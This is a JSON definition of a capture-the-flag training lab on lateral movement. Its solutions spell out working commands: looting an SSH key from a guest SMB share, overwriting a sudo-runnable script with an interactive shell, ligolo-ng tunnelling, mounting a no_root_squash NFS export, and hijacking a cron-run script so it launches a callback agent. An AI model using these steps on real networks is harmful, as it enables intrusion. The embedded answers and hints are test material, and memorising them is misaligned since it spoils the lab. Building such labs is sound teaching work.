{
  "title": "CR-18 / Module 5 / N5b — Intermediate Lateral Movement & Network Pivoting",
  "description": "Break into a DMZ host over a leaked SMB credential, escalate locally, then pivot twice through a segmented three-tier network using ligolo-ng to reach a Management-only service. Lateral Movement & Network Pivoting (CTF2).",
  "prerequisites": [
    "Comfort using a Linux shell and an SSH client",
    "Basic understanding of TCP/IP networking and firewalls",
    "Familiarity with dictionary/enumeration tooling (nmap, smbclient)",
    "CR-18-n5a (Lateral Movement & Network Pivoting CTF1), or equivalent hands-on pivoting experience"
  ],
  "outcomes": [
    "Demonstrate lateral movement across a segmented DMZ, Internal, and Management architecture",
    "Chain multiple pivoting techniques to bypass layered network defenses",
    "Exploit implicit trust and shared services (SMB, NFS) in enterprise environments",
    "Understand how routing, service, and scheduling misconfigurations undermine network segmentation",
    "Relate multi-tier pivoting attacks to real-world enterprise compromise scenarios"
  ],
  "state": "UNRELEASED",
  "levels": [
    {
      "title": "Introduction level",
      "level_type": "INFO_LEVEL",
      "order": 0,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "content": "Welcome to CR-18-n5b — Lateral Movement & Network Pivoting.\n\nThe client has segmented their network into three tiers — DMZ, Internal, and Management — and believes that keeps them safe. Your job: prove otherwise.\n\nFrom your assessment machine, you'll break into a DMZ host, escalate to root, then pivot twice — into Internal, then Management — using a modern tunnelling tool and a classic file-sharing trust flaw.\n\nYou already have everything you need: nmap, smbclient, an NFS client, SSH, and ligolo-ng. Read the background level right after this one if you haven't used these tools before, and keep the Tools & Techniques Manual handy on the LMS for quick syntax lookups.\n\nOne leaked credential, one local misconfiguration, and two pivots — that's the whole chain from the DMZ to a service the client assumed was out of reach.\n\n**Ignore anything from the 192.168.x.x range — that's just the box talking to itself, not part of the challenge.**"
    },
    {
      "title": "Get Access",
      "level_type": "ACCESS_LEVEL",
      "order": 1,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "passkey": "start-training",
      "cloud_content": "In the topology panel on the right, right-click **attacker** and select **Open GUI In New Window**. Log in with username **user** and password **password123**.\n\nYou will need three shells open at the same time later on - the ligolo proxy console, an SSH session to the DMZ host, and a shell for routing commands. The desktop gives you that. If you would rather work in one window, `tmux` is installed.\n\n\nOnce you're connected, submit the passkey **start-training** to unlock the next level.",
      "local_content": "This sandbox has not been validated for local-only deployment."
    },
    {
      "title": "Background — pivoting with ligolo-ng, NFS trust, and scheduled tasks",
      "level_type": "INFO_LEVEL",
      "order": 2,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "content": "This challenge chains three techniques you may not have used before. Read this once before you start — it will make every later stage faster.\n\n\n## Pivoting with ligolo-ng\n\nligolo-ng tunnels traffic through a compromised host without relying on raw IP forwarding — it relays connections at the application layer instead, which is more reliable across segmented networks. It has two halves:\n\n* **proxy** — runs on YOUR machine. Gives you an interactive console and, once a tunnel is active, a virtual network interface called `ligolo` that carries your traffic into the target network.\n* **agent** — runs on a host you've compromised. Connects back to the proxy and does the actual relaying.\n\nBasic flow:\n\n    # on your machine\n    sudo ./proxy -laddr 0.0.0.0:11601 -selfcert\n\n    # on the compromised host\n    ./agent -connect <your_ip>:11601 -ignore-cert\n\nBack on the proxy console:\n\n    session                 # pick the agent that just connected\n    start                   # brings up the 'ligolo' interface\n\nThen route traffic for the target subnet into it:\n\n    sudo ip route add <subnet>/24 dev ligolo\n\nFrom here, ordinary tools (curl, nmap...) against that subnet are transparently tunnelled. Verify a tunnel with `curl`, not `ping` — ligolo-ng's ICMP support is inconsistent, but TCP relaying is what it's built for.\n\n**Chaining a second hop:** if you need to reach a network only visible from a host you've already pivoted through, add a listener on the existing session first:\n\n    listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601\n\nThen get a second agent running with `-connect` pointed at the *first* compromised host's own internal address (not your machine) and that listener port. It tunnels back automatically and appears as a new session.\n\nWhen you start that second session, give it its own interface name — ligolo-ng won't let two sessions share one, and your first session already claimed `ligolo`:\n\n    start --tun ligolo1\n\nThen route the second network through that specific interface, not the original one:\n\n    sudo ip route add <second_subnet>/24 dev ligolo1\n\n## NFS trust and no_root_squash\n\nNFS lets a server export a folder that other machines mount as if it were local. By default, if a connecting client claims to be root, the server maps that down to an unprivileged account — a safety measure called root squashing. An export configured with `no_root_squash` disables that protection: root on any permitted client is treated as genuine root on the export's contents. If you're root on a machine allowed to mount such a share, you can read root-only files on it directly, and write new root-owned files onto it.\n\n## Scheduled-task escalation\n\nWriting a root-owned file onto a share only matters if something executes it. A very common real-world pattern is a `cron` job on some other host that periodically runs a script it reads from that same share — routine automation the admins forgot was reachable by anyone with write access to the export. Spot the signs (a file with odd permissions, ownership, or a timestamp that keeps changing on its own), replace its contents with your own payload, and wait for the schedule to trigger it. Patience is part of the technique — expect a short wait, not an instant shell."
    },
    {
      "title": "Breach the DMZ",
      "level_type": "TRAINING_LEVEL",
      "order": 3,
      "estimated_duration": 10,
      "minimal_possible_solve_time": 5,
      "answer": null,
      "answer_variable_name": "smb_flag",
      "content": "Your assessment machine sits in the DMZ. The DMZ host in front of you runs a file-sharing service that shouldn't be readable from outside.\n\n**DMZ Host IP: 10.10.10.2**\n\nYour objectives:\n\n* Scan the DMZ host and find the exposed file-sharing service. (useful tools: nmap, smbclient)\n* Connect to the share as a guest — administrators sometimes leave credentials sitting in shares like this.\n* Use what you find to log in to the DMZ host directly. You'll need this access next level.\n\n\nSubmit the **smb_flag** found inside the share.",
      "solution": "* Scan the DMZ host — `nmap -p 445 10.10.10.2` → Returns 445/tcp open  microsoft-ds ->SMB open.\n* List shares — `smbclient -N -L //10.10.10.2/` → a guest-readable share appears.\n* Connect — `smbclient -N //10.10.10.2/public` and then `ls` to view available files\n* Inside the smbclient prompt: `get id_rsa`, `get README.txt`, `get smb_flag.txt`, then `exit`.\n* Fix permissions and log in — `chmod 600 id_rsa` then `ssh -i id_rsa dmzadmin@10.10.10.2`.\n\nFindings:\n* DMZ host account: dmzadmin (key-based)\n* **smb_flag: ${ANSWER}**",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Look closer",
          "content": "Something useful is tucked away in those shared files — look closely, because the credentials you need are hidden there.",
          "hint_penalty": 9,
          "order": 2
        },
        {
          "title": "Find the Open Door",
          "content": "Scan the DMZ host for a file-sharing service before trying anything else.\n\nUseful tool: nmap.",
          "hint_penalty": 3,
          "order": 0
        },
        {
          "title": "Walk Through the Share",
          "content": "SMB shares can often be listed and browsed without a password. Try connecting as a guest.\n\nUseful tool: smbclient (the -N flag skips the password prompt).",
          "hint_penalty": 5,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 5,
      "attachments": [],
      "max_score": 40,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0006.T1552"
        },
        {
          "technique_key": "TA0007.T1046"
        },
        {
          "technique_key": "TA0001.T1078"
        },
        {
          "technique_key": "TA0001.T1133"
        }
      ],
      "expected_commands": [
        "smbclient",
        "ssh",
        "nmap"
      ],
      "commands_required": false
    },
    {
      "title": "Escalate on the DMZ Host",
      "level_type": "TRAINING_LEVEL",
      "order": 4,
      "estimated_duration": 10,
      "minimal_possible_solve_time": 5,
      "answer": null,
      "answer_variable_name": "dmz_root_flag",
      "content": "Log back in to the DMZ host using what you found last level, if you haven't already.\n\nYour account has no general admin rights — but check exactly what it can do as another user.\n\nYour objectives:\n\n* List your sudo privileges. (useful command: `sudo -l`)\n* If one script can be run as root without a password, check whether you can also edit it — that's a root shell in disguise.\n* Escalate to root, and confirm it's genuine root, not just effective root. Some tricks (like SUID on a shell) look like root but aren't, and later stages will reject that.\n\n\nSubmit the **dmz_root_flag**, readable only by root.",
      "solution": "\n* Fix permissions and log in — `chmod 600 id_rsa` then `ssh -i id_rsa dmzadmin@10.10.10.2`.\n* Check sudo rights — `sudo -l` → shows NOPASSWD access to one script, e.g. `/opt/netcheck/netcheck.sh`.\n* Check its permissions — `ls -la /opt/netcheck/netcheck.sh` → world-writable.\n* Overwrite it with a shell and run it via sudo:\n```\necho -e '#!/bin/bash\\nbash -i' > /opt/netcheck/netcheck.sh\nsudo /opt/netcheck/netcheck.sh\n```\n* Confirm it's genuine root — `whoami` and `id` should show `uid=0(root)` with no separate effective-only ID. (Setting the SUID bit on `/bin/bash` instead would leave your real UID unprivileged — avoid that method here, it breaks the pivoting tool you'll use in the next stage.)\n* Read the flag — `cat /root/dmz_root_flag.txt`.\n\n**dmz_root_flag: ${ANSWER}**",
      "solution_penalized": true,
      "hints": [
        {
          "title": "A Script You Can Both Run and Rewrite",
          "content": "If sudo lets you run one specific script as root without a password, check its file permissions. If you can also edit it, replacing its contents gives you root when it runs.\n\n`/opt/netcheck/netcheck.sh` is your target\n",
          "hint_penalty": 6,
          "order": 0
        },
        {
          "title": "Get It Right the First Time",
          "content": "Overwrite the script with something that gives you an interactive shell, then run it the way sudo permits.\n\nCheck the result with `id` before you go further: it must show `uid=0(root)` with nothing else appended. Do NOT reach for `chmod +s /bin/bash` here - it produces a shell that looks like root but is not genuinely root, and it will cause confusing failures in the next stage.",
          "hint_penalty": 11,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 5,
      "attachments": [],
      "max_score": 40,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0004.T1548"
        }
      ],
      "expected_commands": [
        "sudo"
      ],
      "commands_required": false
    },
    {
      "title": "Pivot Into the Internal Network",
      "level_type": "TRAINING_LEVEL",
      "order": 5,
      "estimated_duration": 20,
      "minimal_possible_solve_time": 10,
      "answer": null,
      "answer_variable_name": "pivot_flag",
      "content": "The DMZ host has a second network interface — it also sits on the Internal tier, which your assessment machine can't reach directly. That's your pivot point.\n\nYour objectives:\n\n* Confirm the DMZ host is dual-homed and note its Internal-facing address.\n* The ligolo-ng agent is already on the DMZ host at /opt/ligolo — nothing to deploy. Run the proxy on your own machine, then SSH in and launch that agent, pointing it back at you. (keep proxy and agent running in separate terminals — closing one kills the other)\n* Start the tunnel and route Internal-tier traffic through it.\n* Reach the target app server at **10.10.20.20:8080** — unreachable without the tunnel.\n\n\nSubmit the **pivot_flag** served by that service.",
      "solution": "* use `ip a` from DMZ host to identify the Internal-facing address ->10.10.20.2/24\n* Open a terminal on your machine and start the proxy: `cd /opt/ligolo && sudo ./proxy -laddr 0.0.0.0:11601 -selfcert`. Leave it running.\n* Open a second terminal — SSH to the DMZ host, re-escalate, run the ligolo agent:\n```\nssh -i id_rsa dmzadmin@10.10.10.2\nsudo /opt/netcheck/netcheck.sh\ncd /opt/ligolo\n./agent -connect 10.10.10.10:11601 -ignore-cert\n```\nLeave this running too.\n* Back in the first terminal (your machine), once you see the agent join: `session`, select it, Hit Enter and then `start`.\n\n* Open a third terminal — route Internal-tier traffic into the tunnel and reach the target directly:\n\n```\nsudo ip route add 10.10.20.0/24 dev ligolo\ncurl http://10.10.20.20:8080/\n```\n\n**pivot_flag: ${ANSWER}**",
      "solution_penalized": true,
      "hints": [
        {
          "title": "One Foot in Each Room",
          "content": "Something in the DMZ isn't just visiting — it lives on both networks. Find its second face, then let it carry your traffic where you can't go alone.",
          "hint_penalty": 5,
          "order": 0
        },
        {
          "title": "Two Halves, One Tunnel",
          "content": "Proxy on your machine, agent on theirs, both running at the same time. Once the agent registers, select the session on the proxy console and start it - that is what creates the tunnel interface on your side.\n\nAn interface on its own routes nothing. Add a route for the Internal subnet pointing at it, then reach the app server yourself.",
          "hint_penalty": 12,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 6,
      "attachments": [],
      "max_score": 40,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0011.T1572"
        },
        {
          "technique_key": "TA0011.T1090"
        },
        {
          "technique_key": "TA0007.T1046"
        }
      ],
      "expected_commands": [
        "curl",
        "ip",
        "ligolo"
      ],
      "commands_required": false
    },
    {
      "title": "Abuse a Misconfigured File Share",
      "level_type": "TRAINING_LEVEL",
      "order": 6,
      "estimated_duration": 10,
      "minimal_possible_solve_time": 5,
      "answer": null,
      "answer_variable_name": "nfs_flag",
      "content": "You can now reach the Internal tier. Look for a shared file service on the Internal NFS server — **10.10.20.30**.\n\nYour objectives:\n\n* Enumerate what it exports and which clients are allowed to mount it (`showmount -e 10.10.20.30`).\n* Mount it and see what you can read. The export options are not something a client can ask for, so this is the only way to find out how it is configured.\n\nTwo things worth knowing before you start:\n\n* Mount from the DMZ host, not from your assessment machine - the NFS server checks the real source address.\n* If root-squashing has been disabled on the export, the root you already hold carries straight through onto it.\n\nSubmit the **nfs_flag**, readable only by root, found inside the share.",
      "solution": "* From the DMZ host, enumerate the exports: `showmount -e 10.10.20.30`. It returns the export path and the client list it accepts - `/srv/share 10.10.20.0/24` - and nothing else. Export options live in `/etc/exports` on the server and are never sent to a client, so `no_root_squash` is not something you can read off; you establish it by mounting and finding that a root-only file is readable.\n* From the DMZ host (which has a genuine Internal-tier address — the export won't accept your assessment machine directly, even through the tunnel):\n```\nmkdir -p /mnt/nfs\nmount -t nfs 10.10.20.30:/srv/share /mnt/nfs\nls -la /mnt/nfs/\ncat /mnt/nfs/.nfs_flag\n```\n\n**nfs_flag: ${ANSWER}**\n\nNote: because you're already root on the mounting host, and `no_root_squash` preserves that identity onto the export, the file is readable directly. Keep the share mounted — you'll write to it in the next stage.",
      "solution_penalized": true,
      "hints": [
        {
          "title": "See What's Being Shared",
          "content": "Look for a file-sharing service on the Internal network NFS server and check what it exports and which clients may mount it. `showmount -e` answers that much. It will not tell you the export options, so the only way to learn how the share treats a root user is to mount it and look.",
          "hint_penalty": 2,
          "order": 0
        },
        {
          "title": "Mind Where You Mount From",
          "content": "Some file shares check the real network address of whoever connects. If mounting fails with 'access denied', try it from a DMZ host that actually has an address on the Internal tier, not from your assessment machine. ",
          "hint_penalty": 3,
          "order": 1
        },
        {
          "title": "Where To Mount It From",
          "content": "Mount it from the DMZ host rather than from your assessment machine - the export is scoped to the Internal tier and your machine is not on it.\n\nStandard NFS mount syntax, and create the mountpoint first. Once it is mounted, list the contents and look for a file you would not normally be able to read.",
          "hint_penalty": 12,
          "order": 2
        }
      ],
      "incorrect_answer_limit": 5,
      "attachments": [],
      "max_score": 40,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0001.T1199"
        },
        {
          "technique_key": "TA0007.T1046"
        },
        {
          "technique_key": "TA0004.T1068"
        }
      ],
      "expected_commands": [
        "showmount",
        "mount"
      ],
      "commands_required": false
    },
    {
      "title": "Reach Management",
      "level_type": "TRAINING_LEVEL",
      "order": 7,
      "estimated_duration": 20,
      "minimal_possible_solve_time": 10,
      "answer": null,
      "answer_variable_name": "mgmt_flag",
      "content": "The NFS server is dual-homed too — it also sits on the Management tier, at **10.10.30.30**. No direct login, so you'll make it come to you.\n\nYour objectives:\n\n* Open a second listener on the tunnel you already have. Do this first - a callback needs somewhere to land before anything tries to dial it.\n* On the mounted share, find the file the NFS server runs periodically as root. Permissions, ownership, or a timestamp that changes on its own will single it out.\n* Replace its contents so that the next time it runs, it dials a ligolo agent back to your listener. It only fires on its schedule, so expect to wait a minute or two.\n* When the second session registers on the proxy console, bring it up on its own interface name - the first pivot is already using `ligolo`.\n* Route Management traffic down that interface and reach the final target.\n\nSubmit the **mgmt_flag** served at **10.10.30.100**.",
      "solution": "* On the ligolo-ng proxy console (session from the first pivot still active): `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601`.\n* On the NFS share (still mounted from the previous stage), look for a script with unusual permissions or a changing timestamp — `.sync-check.sh`. Something on the NFS server executes it periodically as root.\n* Overwrite it with the payload:\n```\ncat > /mnt/nfs/.sync-check.sh << 'EOF'\n#!/bin/bash\n/opt/ligolo/agent -connect 10.10.20.2:11601 -ignore-cert &\nEOF\nchmod 755 /mnt/nfs/.sync-check.sh\n```\n* Wait up to about a minute, watching the proxy console — a new agent session appears on its own once the scheduled job fires.\n* Select it with `session`, then start it with a distinct interface name — `ligolo` is already bound to the first pivot session, so reusing it errors with \"a tunnel is already using this interface name\":\n```\nstart --tun ligolo1\n```\n* Route and capture, using that same interface:\n```\nsudo ip route add 10.10.30.0/24 dev ligolo1\ncurl http://10.10.30.100:8080/\n```\n\n**mgmt_flag: ${ANSWER}**",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Order Matters",
          "content": "The listener has to exist before the second agent tries to dial into it — open it first, then plant the payload. If you write the script before the listener's up, the connection has nowhere to land.",
          "hint_penalty": 4,
          "order": 0
        },
        {
          "title": "Something Hidden Is Watching This Share",
          "content": "Check the mounted share with ls -la, not just ls — the file you're after is hidden (dot-prefixed): .sync-check.sh. Its permissions, ownership, or a changing timestamp are what give it away as something run automatically.",
          "hint_penalty": 4,
          "order": 1
        },
        {
          "title": "If Nothing Shows Up At All",
          "content": "No new session after a couple of minutes usually means the write didn't take, or the file isn't executable. Read the file back (`cat /mnt/nfs/.sync-check.sh`) to confirm your payload actually landed. The execute bit is not what to check - the scheduled job invokes the script as `/bin/bash .sync-check.sh`, and bash only needs to read it.",
          "hint_penalty": 9,
          "order": 2
        }
      ],
      "incorrect_answer_limit": 6,
      "attachments": [],
      "max_score": 40,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0011.T1572"
        },
        {
          "technique_key": "TA0004.T1053"
        },
        {
          "technique_key": "TA0007.T1046"
        }
      ],
      "expected_commands": [
        "curl",
        "ip",
        "ligolo"
      ],
      "commands_required": false
    },
    {
      "title": "Module 5 N5b - Completed",
      "level_type": "INFO_LEVEL",
      "order": 8,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "content": "You've reached the end of CR-18-n5b — Lateral Movement & Network Pivoting (CTF2). You walked the full chain: a leaked file-share credential, a local misconfiguration, and two chained pivots — one an application-layer tunnel, the other a scheduled-task trust abuse — to cross three network tiers the client believed were properly isolated. Head back to the LMS to continue the course."
    }
  ],
  "estimated_duration": 70,
  "variant_sandboxes": false
}
